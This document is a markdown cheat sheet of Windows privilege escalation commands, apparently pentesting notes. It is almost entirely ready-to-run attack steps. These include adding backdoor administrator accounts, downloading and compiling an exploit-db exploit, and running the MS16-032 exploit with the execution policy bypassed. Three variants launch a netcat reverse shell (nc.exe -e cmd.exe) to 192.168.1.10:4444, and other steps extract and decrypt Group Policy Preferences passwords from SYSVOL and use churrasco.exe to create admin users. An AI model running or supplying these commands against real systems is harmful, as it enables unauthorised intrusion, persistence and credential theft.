# Useful Command for Windows Privilage Escalation


Windows Privilege Escalation resource http://www.fuzzysecurity.com/tutorials/16.html

## Info

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

## User Add and Admin Group Add

```
net user hacker hacker /add 
net localgroup administrators IWAM_BOB /add
```

***

* **Python Complier exe**

```
 pip install pyinstaller
 wget -O exploit.py http://www.exploit-db.com/download/31853  
 python pyinstaller.py --onefile exploit.py
```

* **Powershell exploit run in cmd**

```
powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
```

* **Windows Run As**

1 - Sysinternal psexec

```
C:\>psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe" 
```

2 - runas.exe

```
C:\>C:\Windows\System32\runas.exe /env /noprofile /user:Test "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"
 Enter the password for Test:
```

3 - Powershell 

```
$username = '<username here>'
$password = '<password here>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","192.168.1.10","4444","-e","cmd.exe") -WorkingDirectory C:\Users\Public
 ```

To start:

```
powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"
```

* **Windows Service Configuration Viewver:**

```
 scsiaccess.exe  
 NT AUTHORITY\SYSTEM:(I)(F)  
 BUILTIN\Administrators:(I)(F)  
 BUILTIN\Users:(I)(RX)  
 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)  
 Everyone:(I)(F)
```

* **Group Policy Preferences**

```
#map the Domain controller SYSVOL share

net use z:\\dc01\SYSVOL

#Find the GPP file: Groups.xml

dir /s Groups.xml

#Review the contents for passwords

type Groups.xml

#Decrypt using GPP Decrypt

gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB
```

* **Windows Server 2003**

```
upload /root/Desktop/test/churrasco.exe C:\\Inetpub\\
shell
churrasco.exe “net user emr Password1 /add”
churrasco.exe “net localgroup Administrator emr /add”
```
